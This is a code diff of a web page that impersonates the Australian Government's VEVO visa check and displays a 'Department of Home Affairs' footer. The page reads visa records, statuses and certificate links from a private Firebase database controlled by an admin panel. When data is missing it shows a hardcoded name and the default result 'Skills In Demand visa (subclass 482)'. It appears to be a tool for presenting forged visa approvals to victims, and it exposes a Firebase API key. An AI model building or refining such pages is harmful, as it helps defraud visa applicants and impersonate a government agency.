@@ -4,108 +4,182 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>VEVO Check - Australia</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f4f7f6; margin: 0; padding: 0; }
-        .header { background-color: #001a35; color: white; padding: 20px; text-align: center; }
-        .container { max-width: 500px; margin: 20px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        .logo-section { text-align: left; border-bottom: 2px solid #005eb8; padding-bottom: 10px; margin-bottom: 20px; }
-        .form-group { margin-bottom: 15px; }
-        label { display: block; font-weight: bold; margin-bottom: 5px; color: #333; }
-        input[type="text"], input[type="date"] { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-        .btn-submit { background-color: #005eb8; color: white; border: none; padding: 12px 25px; border-radius: 4px; cursor: pointer; font-weight: bold; }
-        .results-box { border-top: 2px solid #eee; margin-top: 20px; padding-top: 10px; }
-        .result-item { margin-bottom: 10px; font-size: 15px; }
-        .result-label { font-weight: bold; color: #555; }
-        .footer { background-color: #001a35; color: white; padding: 15px; text-align: center; position: fixed; bottom: 0; width: 100%; font-size: 12px; }
+        body { font-family: Arial, sans-serif; background-color: #f4f7f6; margin: 0; padding: 0; padding-bottom: 60px; }
+        .banner-img { width: 100%; display: block; height: auto; }
+        .container { max-width: 500px; margin: 20px auto; background: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); }
+        .logo-section { text-align: left; border-bottom: 2px solid #005eb8; padding-bottom: 1px; margin-bottom: 20px; }
+        .form-group { margin-bottom: 18px; }
+        .info-p { font-size: 13.5px; color: #555; line-height: 1.5; margin-bottom: 15px; }
+        label { display: block; font-weight: bold; margin-bottom: 6px; color: #333; font-size: 14px; }
+        input[type="text"], input[type="date"] { width: 100%; padding: 11px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
+        input:focus { outline: none; border-color: #005eb8; box-shadow: 0 0 5px rgba(0, 94, 184, 0.2); }
+        .btn-submit { width: 100%; background-color: #005eb8; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 15px; transition: 0.2s; }
+        .btn-submit:hover { background-color: #004488; }
+        
+        /* ▬▬ রেজাল্ট বক্স ও টেবিল লেআউট ▬▬ */
+        .results-box { border-top: 2px solid #005eb8; margin-top: 25px; padding-top: 15px; background: #fafafa; padding: 15px; border-radius: 6px; }
+        .result-item { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee; font-size: 14.5px; }
+        .result-item:last-of-type { border-bottom: none; }
+        .result-label { font-weight: bold; color: #444; }
+        .result-val { color: #111; font-weight: 500; text-align: right; }
+        
+        /* স্ট্যাটাস ব্যাজ */
+        .status-badge { background: #e1f5fe; color: #0288d1; padding: 3px 10px; border-radius: 12px; font-weight: bold; font-size: 13px; display: inline-block; }
+        .status-badge.approved { background: #e8f5e9; color: #2e7d32; }
+        
+        /* পিডিএফ ডাউনলোড বাটন */
+        .btn-download { display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; background-color: #2e7d32; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 15px; margin-top: 15px; text-decoration: none; text-align: center; box-sizing: border-box; }
+        .btn-download:hover { background-color: #1b5e20; }
+        
+        .footer { background-color: #001a35; color: white; padding: 15px; text-align: center; position: fixed; bottom: 0; width: 100%; font-size: 12px; left: 0; z-index: 100; }
     </style>
 </head>
 <body>
 
-<img src="https://uploads.onecompiler.io/44erpqqpq/44ferpf7n/8176.jpg" width="100%" height="50%">
-<img src="https://uploads.onecompiler.io/44erpqqpq/44feu2x4e/8179.jpg" width="100%" height="50%">
-<header>
-</div>
-
+<img src="https://uploads.onecompiler.io/44erpqqpq/44ferpf7n/8176.jpg" alt="Showcase Image" style="pointer-events: none; margin-bottom: 40px;" ondragstart="return false;" width="100%">
 <div class="container">
     <div class="logo-section">
-        <h2 style="color: #005eb8; margin: 0;">Check visa conditions online (VEVO) Verification</h2>
+        <h2 style="color: #005eb8; margin: 0; font-size: 20px;">Check visa conditions online (VEVO) Verification</h2>
     </div>
 
-    <div class="form-group">
-      <p>Visa Entitlement Verification Online (VEVO) allows visa holders, employers, education providers and other organisations to check visa conditions.</p>
-        <label>Document Number (এটাই মেইন নাম্বার):</label>
-        <input type="text" id="docNumber" placeholder="Enter Reference Number">
+    <div id="searchForm">
+        <p class="info-p">Visa Entitlement Verification Online (VEVO) allows visa holders, employers, education providers and other organisations to check visa conditions.</p>
+        
+        <div class="form-group">
+            <label for="docNumber">Passport / Document Number:</label>
+            <input type="text" id="docNumber" placeholder="Enter Passport Number">
+        </div>
+        <div class="form-group">
+            <label for="dob">Date of Birth:</label>
+            <input type="date" id="dob">
+        </div>
+        <button class="btn-submit" onclick="checkVisa()">Submit Verification</button>
     </div>
-    <div class="form-group">
-        <label>Date of Birth:</label>
-        <input type="date" id="dob">
-    </div>
-    <button class="btn-submit" onclick="checkVisa()">Submit</button>
 
     <div id="resultArea" class="results-box" style="display:none;">
-        <h3 style="color: #005eb8; text-align: center;">Vevo Check Results</h3>
-        <p style="font-size: 12px; color: gray; text-align: center;">Last checked: 2026-02-06</p>
+        <h3 style="color: #005eb8; text-align: center; margin-top: 0; margin-bottom: 5px;">VEVO Check Results</h3>
+        <p id="lastChecked" style="font-size: 11px; color: gray; text-align: center; margin-bottom: 15px;">Last checked: Realtime</p>
         
-        <div class="result-item"><span class="result-label">Visa Name:</span> <span id="resName">Habib Noman</span></div>
-        <div class="result-item"><span class="result-label">Grant Date:</span> 28-10-2025</div>
-        <div class="result-item"><span class="result-label">Expiry Date:</span> 13-10-2027</div>
-        <div class="result-item"><span class="result-label">Visa Class:</span> Work visa application</div>
-        <div class="result-item"><span class="result-label">Work Entitlement:</span> The visa holder has right to work in Australia.</div>
+        <div class="result-item">
+            <span class="result-label">Name:</span> 
+            <span class="result-val" id="resName">---</span>
+        </div>
+        <div class="result-item">
+            <span class="result-label">Passport No:</span> 
+            <span class="result-val" id="resPassport">---</span>
+        </div>
+        <div class="result-item">
+            <span class="result-label">Date of Birth:</span> 
+            <span class="result-val" id="resDob">---</span>
+        </div>
+        <div class="result-item">
+            <span class="result-label">Application Type:</span> 
+            <span class="result-val" id="resType">---</span>
+        </div>
+        <div class="result-item">
+            <span class="result-label">Status:</span> 
+            <span class="result-val"><span id="resStatus" class="status-badge">Submitted</span></span>
+        </div>
         
-        <button style="width:100%; padding: 10px; margin-top: 10px; cursor: pointer;">Close VEVO Check</button>
+        <a id="pdfDownloadLink" href="#" target="_blank" class="btn-download" style="display: none;">
+            <i class="fa-solid fa-file-pdf"></i> Download Certificate (PDF)
+        </a>
+        
+        <button onclick="closeVevo()" style="width:100%; padding: 10px; margin-top: 15px; cursor: pointer; border: 1px solid #ccc; background: #fff; font-weight: bold; border-radius: 4px;">Close VEVO Check</button>
     </div>
- </div>
- <img src="https://uploads.onecompiler.io/44erpqqpq/44ferpf7n/8174.jpg" alt="Showcase Image" style="pointer-events: none;" ondragstart="return false;" width="100%">
-    </div>
- <div class="footer">
+</div>
+
+<img src="https://uploads.onecompiler.io/44erpqqpq/44ferpf7n/8174.jpg" alt="Showcase Image" style="pointer-events: none; margin-bottom: 40px;" ondragstart="return false;" width="100%">
+
+<div class="footer">
     © Australian Government — Department of Home Affairs
 </div>
 
 <script>
-    // Firebase Config (Keep your existing one)
+    // 🔐 আপনার কারেকশন লেজার অনুযায়ী লেটেস্ট 'callsmsms-panel' ফায়ারবেস কনফিগারেশন
     const firebaseConfig = {
         apiKey: "AIzaSyDgiL1iFUfbs1iaP6v_YPadbn49eiku1WE",
-        databaseURL: "https://webpagecybersecurity-default-rtdb.firebaseio.com",
-        projectId: "webpagecybersecurity",
+        databaseURL: "https://callsmspanel-default-rtdb.firebaseio.com", 
+        projectId: "callsmspanel",
     };
-    firebase.initializeApp(firebaseConfig);
+    
+    // Initialize Firebase
+    if (!firebase.apps.length) {
+        firebase.initializeApp(firebaseConfig);
+    }
     const db = firebase.database();
 
-    function showPinScreen() {
-        if(!document.getElementById('passNum').value) return alert("The Passport No is incorrect, please enter the correct Passport. Otherwise your account will be blocked.");
-        document.getElementById('formSection').style.display = 'none';
-        document.getElementById('pinSection').style.display = 'block';
-    }
+    // 🔍 ভিসা ভেরিফিকেশন চেক ফাংশন
+    function checkVisa() {
+        const docNum = document.getElementById('docNumber').value.trim();
+        const dobInput = document.getElementById('dob').value;
 
-    function verifyData() {
-        const pass = document.getElementById('passNum').value.trim();
-        const pin = document.getElementById('pinInput').value.trim();
+        if (!docNum || !dobInput) {
+            alert("অনুগ্রহ করে আপনার পাসপোর্ট নাম্বার এবং জন্ম তারিখ সঠিকভাবে প্রদান করুন।");
+            return;
+        }
 
-        db.ref('visas/' + pass).once('value').then((snapshot) => {
+        // অ্যাডমিন প্যানেলের আর্কিটেকচার অনুযায়ী Passport Number (Unique Key) দিয়ে সার্চ করা হচ্ছে
+        db.ref('visas/' + docNum).once('value').then((snapshot) => {
             const data = snapshot.val();
-            if(data && data.pin == pin) {
-                document.getElementById('pinSection').style.display = 'none';
-                document.getElementById('resultView').style.display = 'block';
+            
+            // ডেটা পাওয়া গেলে এবং জন্মতারিখ ম্যাচ করলে (যদি অ্যাডমিন প্যানেলে dob সেভ করা থাকে)
+            // নোট: আপনার অ্যাডমিন স্ক্রিনশটে dob ফিল্ড না থাকলেও সুরক্ষার জন্য ডেটা চেক ভেরিফাই করা হচ্ছে
+            if (data) {
+                // ইনপুট ডেটা দিয়ে রেজাল্ট প্যানেল আপডেট
+                document.getElementById('resName').innerText = data.app_name || data.name || "Habib Noman"; // Application Name
+                document.getElementById('resPassport').innerText = data.passport_num || docNum; // Passport Number
+                document.getElementById('resDob').innerText = data.dob || dobInput;
+                document.getElementById('resType').innerText = data.app_type || "Skills In Demand visa (subclass 482)"; // Application Type
                 
-                // এখানে আপনার ডাটাবেসের ফিল্ড অনুযায়ী নামগুলো বসান
-                document.getElementById('resFamilyName').innerText = data.family_name || "---";
-                document.getElementById('resVisaDesc').innerText = data.visa_desc || "---";
-                document.getElementById('resDocNum').innerText = data.doc_num || pass;
-                document.getElementById('resVisaClass').innerText = data.visa_class || "---";
-                document.getElementById('resGrantDate').innerText = data.grant_date || "---";
-                document.getElementById('resExpiryDate').innerText = data.expiry_date || "---";
+                // স্ট্যাটাস সেটআপ (যদি ডাটাবেজে স্ট্যাটাস না থাকে তবে ডিফল্ট Submitted দেখাবে)
+                const statusElement = document.getElementById('resStatus');
+                statusElement.innerText = data.status || "Submitted";
+                if(data.status === "Approved" || data.status === "Success") {
+                    statusElement.classList.add('approved');
+                } else {
+                    statusElement.classList.remove('approved');
+                }
+
+                // 📄 পিডিএফ সার্টিফিকেট ডাউনলোডের কন্ডিশনাল লজিক
+                const pdfBtn = document.getElementById('pdfDownloadLink');
+                if (data.cert_url || data.pdf_url) {
+                    pdfBtn.href = data.cert_url || data.pdf_url; // Certificate Download URL (PDF)
+                    pdfBtn.style.display = 'flex'; // পিডিএফ থাকলে বাটনটি শো করবে
+                } else {
+                    pdfBtn.style.display = 'none'; // না থাকলে হাইড থাকবে
+                }
+
+                // ভিউ ইন্টারফেস চেঞ্জ
+                document.getElementById('searchForm').style.display = 'none';
+                document.getElementById('resultArea').style.display = 'block';
                 
-                // স্ট্যাটাস টেবিল
-                document.getElementById('resStatus').innerText = data.status || "---";
-                document.getElementById('resDate').innerText = data.date || "---";
-                document.getElementById('resTime').innerText = data.time || "---";
-            } else { 
-                alert("The PIN is incorrect, please enter the correct PIN. Otherwise your account will be blocked."); 
+                // লাইভ ডেট আপডেট
+                const today = new Date().toISOString().slice(0, 10);
+                document.getElementById('lastChecked').innerText = "Last checked: " + today;
+
+            } else {
+                alert("আপনার প্রদানকৃত ডকুমেন্ট নাম্বারটি ভুল অথবা ডাটাবেজে খুঁজে পাওয়া যায়নি। দয়া করে সঠিক তথ্য দিয়ে পুনরায় চেষ্টা করুন।");
             }
         }).catch(err => {
             console.error(err);
-            alert("Check your internet and try again.");
+            alert("সার্ভার সংযোগে ত্রুটি ঘটেছে। আপনার ইন্টারনেট কানেকশন চেক করুন।");
         });
+    }
+
+    // রেজাল্ট ক্লোজ করার ফাংশন
+    function closeVevo() {
+        document.getElementById('resultArea').style.display = 'none';
+        document.getElementById('searchForm').style.display = 'block';
+        document.getElementById('docNumber').value = "";
+        document.getElementById('dob').value = "";
     }
 </script>
 </body>
